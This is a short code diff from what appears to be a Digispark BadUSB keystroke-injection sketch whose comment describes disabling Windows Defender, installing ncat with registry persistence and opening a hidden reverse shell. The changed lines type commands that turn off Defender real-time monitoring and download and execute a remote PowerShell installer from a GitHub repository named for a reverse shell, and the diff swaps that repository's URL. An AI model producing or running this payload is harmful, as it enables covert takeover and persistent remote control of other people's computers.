@@ -66,7 +66,7 @@ void setup() {
 
 // DOWNLOADS POWERSHELL SCRIPT TO: DISABLE DEFENDER MONITORING, DOWNLOAD NCAT, EXPORT NCAT, MOVE NC.EXE TO SYS32, ADD REGISTRY TO RESTART CONNECTION ON RESTARTING PC, AND STARTING CONNECTION WHILE HIDING WINDOWS/PROCESS.
     DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
-    DigiKeyboard.println("IEX(IWR https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/install.ps1 -UseBasicParsing)");
+    DigiKeyboard.println("IEX(IWR https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/install.ps1 -UseBasicParsing)");
     DigiKeyboard.delay(100); // DELAY 100
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
 
